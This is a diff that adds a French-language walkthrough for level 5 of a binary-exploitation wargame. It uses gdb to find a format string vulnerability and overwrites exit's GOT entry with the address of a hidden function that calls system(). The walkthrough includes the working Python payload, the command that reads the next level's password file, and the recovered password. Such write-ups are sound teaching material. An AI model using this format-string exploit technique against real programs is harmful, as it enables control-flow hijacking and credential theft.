@@ -1,0 +1,64 @@
+LEVEL 5
+-------
+
+1.	gdb level5
+
+2.	disas main
+	On voit que la fonction main appelle une fonction annexe, la fonction n()
+	0x0804850a <+6>:	call   0x80484c2 <n>
+
+3.	disas n
+	Dans la fonction n, encore une fois nous avons fgets et
+	printf, on suppose qu'il faut utiliser la faille format
+	string attack.
+
+	On cherche la place dans la mémoire de notre string envoyée au
+	programme:
+
+	run
+	AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p
+	AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
+	0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
+	0x70252070
+
+	Comme le level 3, c'est à la 4ème place.
+
+	Cependant, dans la fonction n() il n'y a pas d'appel à
+	system() pour lancer un shell.
+
+4.	info functions
+	0x080484a4  o
+	0x080484c2  n
+	0x08048504  main
+	La fonction o n'est pas appelée dans main() et n().
+	C'est elle qui contient l'appel à system().
+	Donc il faut trouver un moyen de l'appeler. Nous retenons
+	son adresse.
+
+5.	Pour l'appeler on va changer la valeur de retour d'exit()
+	de la fonction n(). EIP n'est pas disponible ici parce que
+	l'exit est fait avant le ret.
+
+	info function exit
+	Non-debugging symbols:
+	0x08048390  _exit
+	0x08048390  _exit@plt
+	0x080483d0  exit
+	0x080483d0  exit@plt
+
+	x/i 0x080483d0
+	0x80483d0 <exit@plt>:	jmp    *0x8049838
+
+	On va ajouter à l'adresse 0x8049838, la valeur décimale de
+	l'adresse de la fonction o().
+	Adresse de la fonction o() en décimal: 0x080484a4 --> 134513828
+
+6.	Passons maintenant à la commande python.
+	python -c 'print "\x38\x98\x04\x08"+"%134513824d%4$n"' > /tmp/lvl5
+	cat /tmp/lvl5 - | ./level5
+
+	cat /home/user/level6/.pass
+	d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+7.	su level6
+	d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
